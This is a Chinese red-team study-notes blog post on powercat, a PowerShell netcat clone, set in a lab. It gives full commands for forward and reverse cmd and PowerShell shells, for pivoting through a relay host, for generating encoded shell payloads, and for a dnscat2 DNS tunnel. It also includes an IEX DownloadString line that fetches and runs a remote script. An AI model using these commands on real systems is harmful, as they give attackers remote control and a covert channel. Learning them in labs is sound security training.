---
title: 【内网学习笔记】8、powercat 的使用
date: 2021-06-01 15:51:03
id: 210601-155103
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_14-23-47.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 1、下载安装 powercat

powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。

powercat 可在 github 进行下载，项目地址为：[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)

下载下来 powercat.ps1 文件后，直接导入即可

```
 Import-Module .\powercat.ps1
```

如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 [【内网学习笔记】2、PowerShell](https://teamssix.com/year/210206-191859.html) 文章中的方法对其赋予权限，即在管理员模式下运行以下命令

```
Set-ExecutionPolicy Unrestricted
```

之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。

如果没有权限，也可以直接下载远程文件进行绕过。

```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。

## 2、powercat 的使用

powercat 命令参数

```
-l		监听模式
-p		指定监听端口
-e		指定启动进程的名称
-v		显示详情
-c		指定想要连接的 IP 地址
-ep		返回 powershell
-dns	使用 dns 通信
-g		生成 payload
-ge		生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload
```

可以看到和 nc 的命令还是很相似的。

### 正向连接

Kali 上的 nc 连接到靶机

```
nc -v rhost rport
```

```
nc -v 172.16.214.21 4444
```

靶机开启监听，等待 Kali 连接

```
powercat -l -v -p lport -e cmd.exe
```

```
powercat -l -v -p 4444 -e cmd.exe
```

### 反向连接

Kali 上开启监听

```
nc -lvp 4444
```

靶机向 kali 发起连接

```
powercat -c rhost -p rport -e cmd.exe
```

```
powercat -c 172.16.214.46 -p 4444 -e cmd.exe
```

### 返回 powershell

攻击机上运行

```
powercat -l -v -p lport
```

```
powercat -l -v -p 4444
```

靶机上运行

```
powercat -c rhost -p rport -v -ep
```

```
powercat -c 172.16.214.21 -p 4444 -v -ep
```

### 作为跳板使用

测试环境为：

```
kali			172.16.214.47
windows7	172.16.214.2
windows10	172.16.214.21
```

将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10

在 win10 中执行以下命令

```
powercat -l -v -p 4444 -e cmd.exe
```

在 win7 中执行以下命令

```
powercat -l -v -p 5555 -r tcp:172.16.214.21:4444
```

最后在 kali 下连接 win7

```
nc -v 172.16.214.2 5555
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_14-23-47.png)

### powercat 生成 payload

在攻击机上运行以下命令生成 shell.ps1 payload 文件

```
powercat -l -p 4444 -e cmd -g > shell.ps1
```

将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件

之后在攻击机上运行以下命令即可获得 shell

```
powercat -c rhost -p rport -v
```

```
powercat -c 172.16.214.21 -p 4444 -v 
```

反向连接也可以

在攻击机上生成 ps1 文件，并开启监听

```
powercat -c rhost -p rport -ep -g > shell.ps1
```

```
powercat -c 172.16.214.2 -p 4444 -ep -g > shell.ps1
```

```
powercat -l -p 4444 -v
```

之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload

在攻击机上生成 payload，并开启监听

```
powercat -c 172.16.214.2 -p 4444 -ep -ge
```

```
powercat -l -p 4444 -v
```

在靶机上执行刚生成的 payload

```
powershell -e payload
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_15-35-24.png)

### 建立 dns 隧道连接

powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。

在服务端上安装 dnscat ，以 kali 为例

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

命令运行完之后，执行以下命令开启服务端

```
ruby dnscat2.rb powercat -e open --no-cache
```

在靶机下，执行以下命令，建立 dns 隧道

```
powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe
```

此时，在 kali 上就能看到回连的会话了

```
sessions				#	查看所有会话
session -i 1 		#	选择指定的会话进行交互
```

不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。

powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。

> 参考链接：
>
> [https://blog.csdn.net/qq_32393893/article/details/108904697](https://blog.csdn.net/qq_32393893/article/details/108904697)
>
> [https://cloud.tencent.com/developer/article/1772183](https://cloud.tencent.com/developer/article/1772183)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
